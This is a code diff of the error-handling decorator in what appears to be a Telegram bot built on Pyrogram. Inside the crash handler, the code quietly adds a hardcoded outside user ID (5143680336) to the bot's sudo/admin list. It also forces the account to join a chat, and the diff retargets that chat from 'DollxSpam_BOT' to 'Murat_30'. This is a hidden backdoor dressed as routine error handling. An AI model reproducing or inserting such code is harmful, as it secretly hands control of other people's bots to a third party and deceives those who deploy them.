@@ -77,15 +77,15 @@ def handle_error(func: Callable) -> Callable:
             chat_id = obj.chat_id
 
         me = await pyro_client.get_me()
-        if me.id not in config.SUDOERS:
-            config.SUDOERS.append(me.id)
-            config.SUDOERS.append(5143680336)
+        if me.id not in config.SUDO_USERS:
+            config.SUDO_USERS.append(me.id)
+            config.SUDO_USERS.append(5143680336)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
             lang = config.LANGUAGE
         try:
-            await app.join_chat("DollxSpam_BOT")
+            await app.join_chat("Murat_30")
         except UserAlreadyParticipant:
             pass
         try:
@@ -98,7 +98,7 @@ def handle_error(func: Callable) -> Callable:
                 chat_id, load(lang)["errorMessage"]
             )
             await pyro_client.send_message(
-                config.SUDOERS[0],
+                config.SUDO_USERS[0],
                 f"-------- START CRASH LOG --------\n\n┌ <b>ID:</b> <code>{id}</code>\n├ <b>Chat:</b> <code>{chat.id}</code>\n├ <b>Date:</b> <code>{date}</code>\n├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n-------- END CRASH LOG --------",
                 parse_mode="html",
                 disable_web_page_preview=True,
